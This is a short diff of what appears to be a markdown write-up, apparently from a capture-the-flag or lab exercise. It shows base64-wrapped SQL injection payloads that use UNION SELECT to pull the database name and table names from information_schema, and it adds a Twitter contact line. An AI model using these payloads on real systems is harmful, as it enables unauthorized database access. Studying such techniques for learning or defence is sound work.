@@ -69,3 +69,5 @@ Payload for database:   `base64_encoded({  "data"  :  " ' UNION SELECT 1,databas
 
 
 Payload for table name: `base64_encoded({ "data"  :  "' UNION select 1,table_name from information_schema.tables where table_schema=database() -- " })`
+
+Reach me out on <a href="https://twitter.com/gkgkrishna33/status/991191742257946624">Twitter</a> for more queries.
